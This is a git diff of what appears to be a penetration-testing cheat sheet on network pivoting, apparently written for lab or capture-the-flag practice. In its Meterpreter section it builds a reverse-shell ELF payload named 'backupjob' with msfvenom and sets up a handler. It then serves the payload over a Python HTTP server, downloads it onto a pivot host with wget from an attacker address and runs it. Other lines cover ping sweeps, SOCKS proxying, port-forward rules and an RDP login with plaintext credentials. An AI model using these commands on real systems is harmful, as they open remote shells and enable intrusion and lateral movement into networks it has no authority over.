@@ -63,16 +63,21 @@ ssh -R 0.0.0.0:8080:127.0.0.1:8000 ubuntu@10.10.10.5 -N -f
 # Meterpreter Tunneling & Port Forwarding
 
 ```
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+# Attacker HOST
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=Attacker_IP -f elf -o backupjob LPORT=Attacker_PORT
 msf6 > use exploit/multi/handler
 msf6 > set lhost 0.0.0.0
 msf6 > set lport 8080
 msf6 > set payload linux/x64/meterpreter/reverse_tcp
 msf6 > run
+python3 -m http.server 12000
 
+# Pivot HOST
+wget http://Attacker_IP:12000/backupjob
 chmod +x backupjob
 ./backupjob
 
+# Attacker HOST
 run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
 
 # Configuring MSF's SOCKS Proxy
@@ -96,6 +101,7 @@ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
 
 # Reverse Port Forwarding Rules
 meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+
 
 
 
